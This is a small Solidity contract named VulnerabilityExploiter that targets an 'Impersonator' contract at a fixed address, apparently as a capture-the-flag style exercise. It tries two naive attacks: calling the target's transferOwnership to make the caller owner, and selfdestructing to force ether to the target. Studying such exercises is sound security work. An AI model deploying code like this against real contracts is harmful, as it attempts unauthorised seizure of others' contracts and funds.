// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IImpersonator {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
}

contract VulnerabilityExploiter {
    address public constant impersonator = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    
    // Attempt to directly call transferOwnership
    function tryTransferOwnership() external {
        IImpersonator(impersonator).transferOwnership(msg.sender);
    }
    
    // Try to selfdestruct to the impersonator
    function boom() external {
        selfdestruct(payable(impersonator));
    }
}